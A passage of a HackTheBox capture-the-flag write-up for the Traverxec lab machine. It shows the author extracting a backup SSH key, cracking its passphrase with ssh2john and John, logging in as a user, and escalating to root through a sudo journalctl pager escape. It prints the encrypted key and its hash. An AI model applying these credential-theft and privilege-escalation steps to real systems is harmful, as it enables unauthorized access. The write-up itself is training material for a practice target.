[OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">/icons                  /var/nostromo/icons</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs                /home</span><br><span class="line">homedirs_public         public_www</span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line"></span><br><span class="line">homedirs                /home</span><br><span class="line">homedirs_public         public_www</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="HOME-DIRECTORY"><a href="#HOME-DIRECTORY" class="headerlink" title="HOME DIRECTORY"></a>HOME DIRECTORY</h3><p>based on the line <code>$HOMEDIRS</code> we can access <code>/public_www</code> at <code>/home/david</code> directory even it is given us permission‚Äôs denied so i go back to the david‚Äôs directory and enter to <em><code>public_www</code></em> folder</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/var/nostromo/conf$ <span class="built_in">cd</span> /home/david</span><br><span class="line"><span class="built_in">cd</span> /home/david</span><br><span class="line">www-data@traverxec:/home/david$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">www-data@traverxec:/home/david$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david$ <span class="built_in">cd</span> public_www</span><br><span class="line"><span class="built_in">cd</span> public_www</span><br><span class="line">www-data@traverxec:/home/david/public_www$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">index.html  protected-file-area</span><br><span class="line">www-data@traverxec:/home/david/public_www$</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>well there was a <code>protected-file-area</code> and I think it contains data hoping that this one is password but it is a <code>backup-ssh-key</code> not bad ! so :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www$ <span class="built_in">cd</span> protected-file-area</span><br><span class="line"><span class="built_in">cd</span> protected-file-area</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">backup-ssh-identity-files.tgz</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Well since I dont have permission on that folder to do <code>write</code> I unzip and copy the <em>.tgz</em> file into <code>/tmp</code> directory so :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ tar zxvf backup-ssh-identity-files.tgz -C /tmp</span><br><span class="line">&lt;rea$ tar zxvf backup-ssh-identity-files.tgz -C /tmp           </span><br><span class="line">home/david/.ssh/</span><br><span class="line">home/david/.ssh/authorized_keys</span><br><span class="line">home/david/.ssh/id_rsa</span><br><span class="line">home/david/.ssh/id_rsa.pub</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I see that there was <code>ssh-key files</code> which I can use to get in with user david.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@traverxec:/tmp$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">home</span><br><span class="line">systemd-private-52315d40046b4b63a760a2af02bc88ef-systemd-timesyncd.service-3xyrna</span><br><span class="line">update</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_556-2966037836</span><br><span class="line">www-data@traverxec:/tmp$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">www-data@traverxec:/tmp/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">david</span><br><span class="line">www-data@traverxec:/tmp/home$ <span class="built_in">cd</span> david</span><br><span class="line"><span class="built_in">cd</span> david</span><br><span class="line">www-data@traverxec:/tmp/home/david$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr 10 19:37 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr 10 19:37 ..</span><br><span class="line">drwx------ 2 www-data www-data 4096 Oct 25 17:02 .ssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp/home/david$ <span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now what i need is to copy the <code>id_rsa</code> into my machine.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$ <span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F</span><br><span class="line"></span><br><span class="line">seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG</span><br><span class="line">tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W</span><br><span class="line">KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU</span><br><span class="line">RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7</span><br><span class="line">HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc</span><br><span class="line">Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec</span><br><span class="line">dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN</span><br><span class="line">6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO</span><br><span class="line">xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1</span><br><span class="line">Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6</span><br><span class="line">i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T</span><br><span class="line">fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA</span><br><span class="line">bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so</span><br><span class="line">uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I</span><br><span class="line">Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s</span><br><span class="line">9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U</span><br><span class="line">rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua</span><br><span class="line">4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU</span><br><span class="line">/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX</span><br><span class="line">JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+</span><br><span class="line">XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh</span><br><span class="line">hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf</span><br><span class="line">SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM</span><br><span class="line">j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt</span><br><span class="line">VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Decrypt-SSH-Key-with-ssh2john"><a href="#Decrypt-SSH-Key-with-ssh2john" class="headerlink" title="Decrypt SSH Key with ssh2john"></a>Decrypt SSH Key with ssh2john</h3><p>I try to login in SSH with <code>id_rsa</code> I thought i can get in into machine but it needs a passphrase‚Äô to get that i decrypt <code>id_rsa</code> with <code>ssh2john</code> to get the hash.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> took <span class="number">3</span>s </span><br><span class="line">‚ùØ python ssh2john.py id_rsa &gt; id_rsa-hash</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ ls</span><br><span class="line">cve2019_16278.py  david  id_rsa  id_rsa-hash  LinEnum.sh  nmap-Traverxec  ssh2john.py</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ cat id_rsa-hash </span><br><span class="line">id_rsa:$sshng$<span class="number">1</span>$<span class="number">16</span>$<span class="number">477</span>EEFFBA56F9D283D349033D5D08C4F$<span class="number">1200</span>$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that I have the hash it‚Äôs time to use <em><code>John</code></em> to decrypt and get the password.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ john id_rsa-hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using <span class="literal">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">SSH [RSA/DSA/EC/OPENSSH (SSH <span class="keyword">private</span> keys</span>) 32/64])</span></span><br><span class="line"><span class="function">Cost 1 (<span class="params">KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]</span>) <span class="keyword">is</span> 0 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Cost 2 (<span class="params">iteration count</span>) <span class="keyword">is</span> 1 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span></span><br><span class="line"><span class="function">finding a possible candidate.</span></span><br><span class="line"><span class="function">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">hunter</span>           (<span class="params">id_rsa</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2.7.17 </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<h3 id="Login-with-SSH-and-get-user-txt"><a href="#Login-with-SSH-and-get-user-txt" class="headerlink" title="Login with SSH and get user.txt"></a>Login with SSH and get user.txt</h3><p>Looks good ! This enough I think, not it‚Äôs time to login with SSH with passphrase <em><code>hunter</code></em>.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ ssh -v -i id_rsa david@<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line">OpenSSH_8<span class="number">.1</span>p1 Debian<span class="number">-1</span>, OpenSSL <span class="number">1.1</span><span class="number">.1</span>d  <span class="number">10</span> Sep <span class="number">2019</span></span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line <span class="number">19</span>: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> [<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>] port <span class="number">22.</span></span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa type <span class="number">-1</span></span><br><span class="line">debug1: identity file id_rsa-cert type <span class="number">-1</span></span><br><span class="line">debug1: Local version <span class="built_in">string</span> SSH<span class="number">-2.0</span>-OpenSSH_8<span class="number">.1</span>p1 Debian<span class="number">-1</span></span><br><span class="line">debug1: Remote protocol version <span class="number">2.0</span>, remote software version OpenSSH_7<span class="number">.9</span>p1 Debian<span class="number">-10</span>+deb10u1</span><br><span class="line">debug1: match: OpenSSH_7<span class="number">.9</span>p1 Debian<span class="number">-10</span>+deb10u1 pat OpenSSH* compat <span class="number">0x04000000</span></span><br><span class="line">debug1: Authenticating to <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>:<span class="number">22</span> <span class="keyword">as</span> <span class="string">&#x27;david&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;<span class="keyword">implicit</span>&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;<span class="keyword">implicit</span>&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:CiO/pUMzd+<span class="number">6b</span>HnEhA2rAU30QQiNdWOtkEPtJoXnWzVo</span><br><span class="line">debug1: Host <span class="string">&#x27;10.10.10.165&#x27;</span> <span class="keyword">is</span> known <span class="keyword">and</span> matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:<span class="number">7</span></span><br><span class="line">debug1: rekey <span class="keyword">out</span> after <span class="number">134217728</span> blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after <span class="number">134217728</span> blocks</span><br><span class="line">debug1: Will attempt key: id_rsa  <span class="keyword">explicit</span></span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2<span class="number">-256</span>,rsa-sha2<span class="number">-512</span>,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="keyword">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Trying <span class="keyword">private</span> key: id_rsa</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">debug1: <span class="function">Authentication <span class="title">succeeded</span> (<span class="params">publickey</span>).</span></span><br><span class="line"><span class="function">Authenticated to 10.10.10.165 (<span class="params">[<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>]:<span class="number">22</span></span>).</span></span><br><span class="line"><span class="function">debug1: channel 0: <span class="keyword">new</span> [client-session]</span></span><br><span class="line"><span class="function">debug1: Requesting no-more-sessions@openssh.com</span></span><br><span class="line"><span class="function">debug1: Entering interactive session.</span></span><br><span class="line"><span class="function">debug1: pledge: network</span></span><br><span class="line"><span class="function">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span></span><br><span class="line"><span class="function">debug1: Remote: /home/david/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding</span></span><br><span class="line"><span class="function">debug1: Sending environment.</span></span><br><span class="line"><span class="function">debug1: Sending env LANG</span> = en_US.utf8</span><br><span class="line">Linux traverxec <span class="number">4.19</span><span class="number">.0</span><span class="number">-6</span>-amd64 <span class="meta">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">Last login: Fri Apr <span class="number">10</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">53</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.15</span><span class="number">.162</span></span><br><span class="line">david@traverxec:~$ whoami</span><br><span class="line">david</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">david@traverxec:~$ ls</span><br><span class="line">bin  public_www  user.txt</span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line"><span class="number">7</span>db0b[--------------------]<span class="number">82f</span>3d</span><br><span class="line">david@traverxec:~$ </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="JOURNALCTL"><a href="#JOURNALCTL" class="headerlink" title="JOURNALCTL"></a>JOURNALCTL</h3><p>This part was tricky the user <em><code>david</code></em> is allowed to run with <em><code>sudo</code></em> command with <code>journalctl</code> which has privilege unto root, but when I try to run <code>sudo -l</code> it requesting for a password I think that was not the right thing to do. so I search about the <code>journalctl</code> and luckily I found it on <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFObins</a></p>
<p><img src="/img/traverxec/journalctl.PNG" alt="HackTheBox-Traverxec" title="Traverxec JOURNALCTL"></p>
<p>It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on <em><code>sudo</code></em>. so I examined first the file <code>server-stats.head</code> this is a HEAD file which is (another file in the bin directory) and some information about the server. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ <span class="built_in">cat</span> server-stats.head</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |&#x27;-.....-&#x27;| |::::|</span></span><br><span class="line"><span class="string">                                                              &#x27;&quot;</span><span class="string">&quot;)---(&quot;</span><span class="string">&quot;&#x27; |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\&quot;    &quot;</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span> </span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The last line of <code>server-stats.sh</code> was very important. It runs sudo first, and then journalctl, which means journalctl is running with root privileges. Therefore, if we can control journalctl, we have root privileges. However, we cannot seem to change any parameters. When running anything <code>sudo journalctl -n5 -unostromo.service</code> other than that, a password will be required.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ <span class="built_in">cat</span> server-stats.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Load: `/usr/bin/uptime`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Last 5 journal log lines:&quot;</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat </span><br><span class="line">david@traverxec:~/bin$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>running the <em><code>server-stats.sh</code></em></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ server-stats.sh</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |&#x27;-.....-&#x27;| |::::|</span></span><br><span class="line"><span class="string">                                                              &#x27;&quot;</span><span class="string">&quot;)---(&quot;</span><span class="string">&quot;&#x27; |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\&quot;    &quot;</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span> </span><br><span class="line"></span><br><span class="line">Load:  19:52:22 up 1 min,  1 user,  load average: 0.16, 0.09, 0.03</span><br><span class="line"> </span><br><span class="line">Open nhttpd sockets: 2</span><br><span class="line">Files <span class="keyword">in</span> the docroot: 117</span><br><span class="line"> </span><br><span class="line">Last 5 journal <span class="built_in">log</span> lines:</span><br><span class="line">-- Logs begin at Thurs 2020-04-09 19:50:59 EDT, end at Fri 2020-04-10 19:52:23 EDT. --</span><br><span class="line">Apr 10 19:51:03 traverxec systemd[1]: nostromo.service: Can<span class="string">&#x27;t open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: started</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: max. file descriptors = 1040 (cur) / 1040 (max)</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec systemd[1]: Started nostromo nhttpd server.</span></span><br><span class="line"><span class="string">Apr 10 19:51:38 traverxec nhttpd[729]: /../../../../bin/sh sent a bad cgi header</span></span><br><span class="line"><span class="string">david@traverxec:~/bin$</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h3 id="Get-the-ADMIN-Shell"><a href="#Get-the-ADMIN-Shell" class="headerlink" title="Get the ADMIN Shell"></a>Get the ADMIN Shell</h3><p>So this is the tricky part. I need to shrink my terminal size into small in order to execute <em><code>!/bin/bash</code></em> command and get the root.<br>first is I need to run <em><code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></em> which has root privileges, it‚Äôs something like this.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>before we execute it I will change my terminal size into small like this.</p>
<p><img src="/img/traverxec/root-traverxec1.png" alt="HackTheBox-Traverxec" title="Traverxec JOURNALCTL"></p>
<p>execute <code>!/bin/bash</code> command and finally I get the root shell and get the <code>root.txt</code></p>
<p>after you go back the terminal size to normal it look like this.</p>
